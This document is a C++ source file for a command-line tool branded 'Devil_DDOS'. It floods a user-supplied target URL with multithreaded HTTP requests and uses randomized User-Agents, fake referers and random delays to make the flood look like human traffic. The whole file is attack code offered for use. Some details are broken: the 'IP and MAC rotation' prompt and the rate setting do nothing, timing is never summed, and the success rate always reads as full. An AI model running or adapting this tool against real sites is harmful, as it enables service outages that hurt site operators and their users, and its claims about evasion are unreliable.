#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>
#include <curl/curl.h>
#include <cstdlib>
#include <ctime>

using namespace std;
using namespace chrono;

#define RESET   "\033[0m"
#define GREEN   "\033[1;32m"
#define RED     "\033[1;31m"
#define YELLOW  "\033[1;33m"
#define CYAN    "\033[1;36m"

// Function to generate random User-Agent from a list of common User-Agents
string random_user_agent() {
    vector<string> user_agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS 5.0; Windows NT 10.0; Win64; x64) like Gecko"
    };
    
    return user_agents[rand() % user_agents.size()];
}

// Function to discard the response body from the server
size_t discard_response(void *ptr, size_t size, size_t nmemb, void *data) {
    return size * nmemb; // Do nothing with the response data
}

// Function to simulate DDoS attack on HTTPS
void https_attack(const string& url, const string& method, int id, int interval, int requests_per_second, ofstream& log) {
    CURL *curl;
    CURLcode res;
    int success = 0;
    double total_time = 0;

    curl_global_init(CURL_GLOBAL_ALL);

    while (true) {  // Keep sending requests until the site crashes or is unreachable
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method.c_str());
            
            // Simulate realistic headers
            string user_agent = random_user_agent();  // Randomize user-agent
            string referer_header = url + "/home";  // Random referer to simulate navigation

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());
            curl_easy_setopt(curl, CURLOPT_REFERER, referer_header.c_str());

            // Discard response body by using a custom write function
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_response);
            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

            // Send the request and check the response
            auto start = system_clock::now();
            res = curl_easy_perform(curl);
            auto end = system_clock::now();
            auto duration = duration_cast<milliseconds>(end - start);

            if (res == CURLE_OK) {
                success++;
                cout << GREEN << "[T" << id << "] Packet Sent (" << duration.count() << "ms)" << RESET << endl;
            } else {
                cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
                break;
            }

            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);

            // Simulate random sleep to make it look like human traffic
            int sleep_time = rand() % 3 + 1;  // Random sleep time between 1-3 seconds
            this_thread::sleep_for(chrono::seconds(sleep_time));
        }
    }

    curl_global_cleanup();

    double avg_time = (success > 0) ? total_time / success : 0;
    log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_time << "ms\n";

    cout << YELLOW << "[T" << id << "] Attack Completed. Success Rate: " << success << "/" << success << RESET << endl;
}

// Function to print the banner with "Devil_DDOS" in red color
void print_banner() {
    cout << RED << R"(
██████╗ ███████╗██╗     ███████╗██╗██╗     ███████╗
██╔══██╗██╔════╝██║     ██╔════╝██║██║     ██╔════╝
██║  ██║█████╗  ██║     █████╗  ██║██║     █████╗  
██║  ██║██╔══╝  ██║     ██╔══╝  ██║██║     ██╔══╝  
██████╔╝███████╗██████╗ ███████╗██║███████╗███████╗
╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝
                                                        
[+] Devil_DDOS Tool Initialized 🔥
    )" << RESET << endl;
}

int main() {
    srand(time(0));  // Seed for random number generation

    print_banner();

    string url, method;
    int threads, interval, requests_per_second;

    // Take inputs for the attack
    cout << CYAN << "[+] Target full URL (e.g. https://yourdomain.com): " << RESET;
    cin >> url;
    cout << CYAN << "[+] Method (GET/POST/HEAD): " << RESET;
    cin >> method;
    cout << CYAN << "[+] Threads: " << RESET;
    cin >> threads;
    cout << CYAN << "[+] Time interval for IP and MAC rotation (seconds): " << RESET;
    cin >> interval;
    cout << CYAN << "[+] Requests per second per thread: " << RESET;
    cin >> requests_per_second;

    cout << GREEN << "[✔] Attack starting..." << RESET << endl;

    // Start multi-threaded attack
    ofstream log("https_attack_metrics.log", ios::app); // Open in append mode
    vector<thread> workers;
    for (int i = 0; i < threads; i++) {
        workers.emplace_back(https_attack, url, method, i + 1, interval, requests_per_second, ref(log));
    }

    for (auto& t : workers) t.join();
    log.close();

    cout << YELLOW << "[✔] Test complete. Logs saved to https_attack_metrics.log" << RESET << endl;
    return 0;
}
